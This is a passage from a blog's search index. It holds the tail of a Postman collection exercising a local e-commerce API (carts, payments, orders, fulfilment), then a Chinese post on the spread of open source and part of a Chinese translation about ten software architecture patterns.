[</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;store&quot;</span>,</span><br><span class="line">						<span class="string">&quot;auth&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;4.1 get regions&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/store/regions&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;store&quot;</span>,</span><br><span class="line">						<span class="string">&quot;regions&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;5.Create a cart&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n    \&quot;region_id\&quot;: \&quot;reg_01G1FPXMTTD926PVCYW9WT9QSN\&quot;,\n    \&quot;country_code\&quot;: \&quot;cn\&quot;\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/store/carts&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;store&quot;</span>,</span><br><span class="line">						<span class="string">&quot;carts&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;5.1 Add a item&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n    \&quot;variant_id\&quot;: \&quot;variant_01G1G2029D4ASNYWGEX9TCSVTY\&quot;,\n    \&quot;quantity\&quot;: 1\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/store/carts/cart_01G1G1R5D2JCA2CP0HV55JHEMJ/line-items&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;store&quot;</span>,</span><br><span class="line">						<span class="string">&quot;carts&quot;</span>,</span><br><span class="line">						<span class="string">&quot;cart_01G1G1R5D2JCA2CP0HV55JHEMJ&quot;</span>,</span><br><span class="line">						<span class="string">&quot;line-items&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;5.2Add a Shipping Method&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n    \&quot;option_id\&quot;: \&quot;so_01G1FZ76DY5XVRT64639856AR0\&quot;\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;5.3Calculate Cart Taxes&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/store/carts/cart_01G1G1R5D2JCA2CP0HV55JHEMJ/taxes&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;store&quot;</span>,</span><br><span class="line">						<span class="string">&quot;carts&quot;</span>,</span><br><span class="line">						<span class="string">&quot;cart_01G1G1R5D2JCA2CP0HV55JHEMJ&quot;</span>,</span><br><span class="line">						<span class="string">&quot;taxes&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;5.4Initialize Payment Sessions&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/store/carts/cart_01G1G1R5D2JCA2CP0HV55JHEMJ/payment-sessions&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;store&quot;</span>,</span><br><span class="line">						<span class="string">&quot;carts&quot;</span>,</span><br><span class="line">						<span class="string">&quot;cart_01G1G1R5D2JCA2CP0HV55JHEMJ&quot;</span>,</span><br><span class="line">						<span class="string">&quot;payment-sessions&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;5.5Complete a Cart - create an order&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/store/carts/cart_01G1G1R5D2JCA2CP0HV55JHEMJ/complete&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;store&quot;</span>,</span><br><span class="line">						<span class="string">&quot;carts&quot;</span>,</span><br><span class="line">						<span class="string">&quot;cart_01G1G1R5D2JCA2CP0HV55JHEMJ&quot;</span>,</span><br><span class="line">						<span class="string">&quot;complete&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;6.Capture an Order - payment finished&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/admin/orders/order_01G1G6DRGQQX5QBF7RQY1JYWWQ/capture&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">						<span class="string">&quot;orders&quot;</span>,</span><br><span class="line">						<span class="string">&quot;order_01G1G6DRGQQX5QBF7RQY1JYWWQ&quot;</span>,</span><br><span class="line">						<span class="string">&quot;capture&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;7.Create a Fulfillment - order fulfilled&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n    \&quot;items\&quot;: [\n        &#123;\n            \&quot;item_id\&quot;: \&quot;item_01G1G21Z2G7VDXYZ51AZM53YNN\&quot;,\n            \&quot;quantity\&quot;: 1\n        &#125;\n    ],\n    \&quot;metadata\&quot;: &#123;&#125;,\n    \&quot;no_notification\&quot;: false\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/admin/orders/order_01G1G6DRGQQX5QBF7RQY1JYWWQ/fulfillment&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">						<span class="string">&quot;orders&quot;</span>,</span><br><span class="line">						<span class="string">&quot;order_01G1G6DRGQQX5QBF7RQY1JYWWQ&quot;</span>,</span><br><span class="line">						<span class="string">&quot;fulfillment&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;8.Create a Shipment - order shipped&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n    \&quot;fulfillment_id\&quot;: \&quot;ful_01G1JKV7Y3V25GDBE8T30EH0GB\&quot;\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/admin/orders/order_01G1G6DRGQQX5QBF7RQY1JYWWQ/shipment&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">						<span class="string">&quot;orders&quot;</span>,</span><br><span class="line">						<span class="string">&quot;order_01G1G6DRGQQX5QBF7RQY1JYWWQ&quot;</span>,</span><br><span class="line">						<span class="string">&quot;shipment&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>eCommerce</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-开源几乎是躲不掉的</title>
    <url>/2019/12/25/2020-%E5%BC%80%E6%BA%90%E5%87%A0%E4%B9%8E%E6%98%AF%E8%BA%B2%E4%B8%8D%E6%8E%89%E7%9A%84/</url>
    <content><![CDATA[<p>开源是社会化协作的基础。随着软件越来越昂贵、风险越来越大，单靠一个企业内的合作已经不够了，需要全球供应链、全球生产链来共同生产软件、维护软件、交付软件。开源也是社会化生产的需要。经过20年的发展，开源已经今非昔比。20年前，开源是一种软件的开发和交付方式；2020年，开源已经演进发展为一种生态竞争的模式。</p>
<p>开源的生产交付模式已发展成熟。2019年，70%的财富50强企业为GitHub（代码托管网站）贡献了开源代码。开源已经形成了两种模式：基金会主导模式（Linux模式）和企业主导模式（Android模式）。码农数量激增，因为码农是数字社会先进生产力的代表。</p>
<p>总而言之，开源几乎是躲不掉的，99%的组织已经在其 IT系统中使用了开源软件。2019年，中国的代码贡献量上升了48%。在中国，过去，开源的核心是国际项目本土化，现在，国内开源的焦点是本土项目国际化。重要的是，要将风险管控前置来治理开源。</p>
<p>参考链接：</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MzU0NjMwNQ==&mid=2650775179&idx=1&sn=9c0483223a5c674a264435c8f45257df&chksm=be9e57a589e9deb3f90df0ab8526f0e4062683f5fcd11cfec84d7eae6c4986fcbf9ee03e15be&scene=126&sessionid=1577256432&key=aabc9a1c91021d5f7917a04ec6b8a4b16b612a92d2797e429cd211a1c52943194c7d248eca5ed75c624114d27f3b94a512ab92469db5ca533044c56dd3192800bf2a7b6a43b04847b86e42ef35a10c47&ascene=1&uin=MjY4NjE1NTk4MQ==&devicetype=Windows+10&version=6207024c&lang=zh_CN&exportkey=ARF/JA5tAVySowpRILavDPY=&pass_ticket=pyDLgWgT7dW4krwK/YeeWa+Zq9eUjSTfG+PZRWENNIf8Qe283i2Kg/7NQsGHRUeG">何宝宏：预见2020，拐点已至丨风向Talks</a></p>
<p><a href="https://spdx.org/licenses/">https://spdx.org/licenses/</a></p>
]]></content>
      <tags>
        <tag>开源协议</tag>
      </tags>
  </entry>
  <entry>
    <title>10种常见的软件架构模式</title>
    <url>/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>原文作者：<a href="https://medium.com/@vijinimallawaarachchi?source=post_header_lockup">Vijini Mallawaarachchi</a><br>原文地址：<a href="https://medium.com/towards-data-science/10-common-software-architectural-patterns-in-a-nutshell-a0b47a1e9013">10 Common Software Architectural Patterns in a nutshell</a></p>
<p>有没有想过要设计多大的企业规模系统？在主要的软件开发启动之前，我们必须选择好体系结构，它将为我们提供所需的功能和质量。因此，在将它们应用到具体设计之前，我们应该了解不同的体系结构。</p>
<p><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/1.png"></p>
<h3 id="什么是架构模式？"><a href="#什么是架构模式？" class="headerlink" title="什么是架构模式？"></a>什么是架构模式？</h3><p>根据维基百科中的定义：</p>
<blockquote>
<p>架构模式是一个通用的、可重用的解决方案，用于在给定上下文中的软件体系结构中经常出现的问题。架构模式与软件设计模式类似，但具有更广泛的范围。</p>
</blockquote>
<p>在本文中，将简要地解释以下10种常见的体系架构模式，以及它们的用法、优缺点。</p>
<ol>
<li>Layer 分层模式</li>
<li>CS 客户端-服务器模式</li>
<li>MS 主从设备模式</li>
<li>Filter 管道-过滤器模式</li>
<li>Broker 代理模式</li>
<li>P2P 点对点模式</li>
<li>Bus 事件总线模式</li>
<li>MVC 模型-视图-控制器模式</li>
<li>Blockboard 黑板模式</li>
<li>Expression 解释器模式</li>
</ol>
<h3 id="一-Layer-分层模式"><a href="#一-Layer-分层模式" class="headerlink" title="一. Layer 分层模式"></a>一. Layer 分层模式</h3><p>这种模式也称为多层体系架构模式。它可以用来构造可以分解为子任务组的程序，每个子任务都处于一个特定的抽象级别。每个层都为下一个提供更高层次服务。</p>
<p>一般信息系统中最常见的是如下所列的4层。</p>
<ul>
<li>表示层(也称为UI层)</li>
<li>应用层(也称为服务层)</li>
<li>业务逻辑层(也称为领域层)</li>
<li>数据访问层(也称为持久化层)</li>
</ul>
<p>使用场景：</p>
<ul>
<li>一般的桌面应用程序</li>
<li>电子商务Web应用程序</li>
</ul>
<p><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/2.png"></p>
<h3 id="二-CS-客户端-服务器模式"><a href="#二-CS-客户端-服务器模式" class="headerlink" title="二. CS 客户端-服务器模式"></a>二. CS 客户端-服务器模式</h3><p>这种模式由两部分组成：一个服务器和多个客户端。服务器组件将为多个客户端组件提供服务。客户端从服务器请求服务，服务器为这些客户端提供相关服务。此外，服务器持续侦听客户机请求。</p>
<p>使用场景：</p>
<ul>
<li>电子邮件，文件共享和银行等在线应用程序<br><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/3.png"></li>
</ul>
<h3 id="三-MS-主从设备模式"><a href="#三-MS-主从设备模式" class="headerlink" title="三. MS 主从设备模式"></a>三. MS 主从设备模式</h3><p>这种模式由两方组成,主设备和从设备。主设备组件在相同的从设备组件中分配工作，并计算最终结果，这些结果是从设备返回的结果。</p>
<p>使用场景：</p>
<ul>
<li>在数据库复制中，主数据库被认为是权威的来源，并且要与之同步</li>
<li>在计算机系统中与总线连接的外围设备(主和从驱动器)<br><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/4.png"></li>
</ul>
<h3 id="四-管道-过滤器模式"><a href="#四-管道-过滤器模式" class="headerlink" title="四. 管道-过滤器模式"></a>四. 管道-过滤器模式</h3><p>此模式可用于构造、生成和处理数据流的系统。每个处理步骤都封装在一个过滤器组件内。要处理的数据是通过管道传递的。这些管道可以用于缓冲或用于同步。</p>
<p>使用场景：</p>
<ul>
<li>编译器。连续的过滤器执行词法分析、解析、语义分析和代码生成</li>
<li>生物信息学的工作流<br><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/5.png"></li>
</ul>
<h3 id="五-代理模式"><a href="#五-代理模式" class="headerlink" title="五. 代理模式"></a>五. 代理模式</h3><p>此模式用于构造具有解耦组件的分布式系统。这些组件可以通过远程服务调用彼此交互。代理组件负责组件之间的通信协调。</p>
<p>服务器将其功能(服务和特征)发布给代理。客户端从代理请求服务，然后代理将客户端重定向到其注册中心的适当服务。</p>
<p>使用场景：</p>
<ul>
<li>消息代理软件，如Apache ActiveMQ，Apache Kafka，RabbitMQ和JBoss Messaging</li>
<li>负债均衡 Ngix</li>
</ul>
<p><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/6.png"></p>
<h3 id="六-点对点模式"><a href="#六-点对点模式" class="headerlink" title="六. 点对点模式"></a>六. 点对点模式</h3><p>在这种模式中，单个组件被称为对等点。对等点可以作为客户端，从其他对等点请求服务，作为服务器，为其他对等点提供服务。对等点可以充当客户端或服务器或两者的角色，并且可以随时间动态地更改其角色。</p>
<p>使用场景：</p>
<ul>
<li>像Gnutella和G2这样的文件共享网络</li>
<li>多媒体协议，如P2PTV和PDTP</li>
<li>像Spotify这样的专有多媒体应用程序</li>
</ul>
<p><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/7.png"></p>
<h3 id="七-事件总线模式"><a href="#七-事件总线模式" class="headerlink" title="七. 事件总线模式"></a>七. 事件总线模式</h3><p>这种模式主要是处理事件，包括4个主要组件：事件源、事件监听器、通道和事件总线。消息源将消息发布到事件总线上的特定通道上。侦听器订阅特定的通道。侦听器会被通知消息，这些消息被发布到它们之前订阅的一个通道上。</p>
<p>使用场景：</p>
<ul>
<li>安卓开发</li>
<li>通知服务</li>
</ul>
<p><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/8.png"></p>
<h3 id="八-MVC-模型-视图-控制器模式"><a href="#八-MVC-模型-视图-控制器模式" class="headerlink" title="八. MVC 模型-视图-控制器模式"></a>八. MVC 模型-视图-控制器模式</h3><p>这种模式，也称为MVC模式，把一个交互式应用程序划分为3个部分，</p>
<ul>
<li>模型：包含核心功能和数据</li>
<li>视图：将信息显示给用户(可以定义多个视图)</li>
<li>控制器：处理用户输入的信息<br>这样做是为了将信息的内部表示与信息的呈现方式分离开来，并接受用户的请求。它分离了组件，并允许有效的代码重用。</li>
</ul>
<p>使用场景：</p>
<ul>
<li>在主要编程语言中互联网应用程序的体系架构</li>
